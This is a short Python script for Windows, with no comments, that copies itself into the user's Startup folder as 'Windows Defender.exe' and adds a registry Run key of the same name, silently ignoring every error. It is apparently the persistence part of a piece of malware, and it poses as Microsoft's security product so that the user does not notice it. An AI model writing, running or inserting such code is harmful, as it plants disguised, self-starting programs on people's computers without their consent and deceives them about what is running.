import winreg as reg
import shutil
import os
import sys

script_path = os.path.realpath(sys.argv[0])
autohzzh = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
hzzh_path = os.path.join(autohzzh, 'Windows Defender.exe')

def hzzhtemp():
    try:
        shutil.copy(script_path, hzzh_path)
    except:
        pass
def hzzhreg():
    try:
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, "Windows Defender", 0, reg.REG_SZ, hzzh_path)
        reg.CloseKey(registry_key)
    except Exception as e:
        pass

hzzhtemp()
hzzhreg()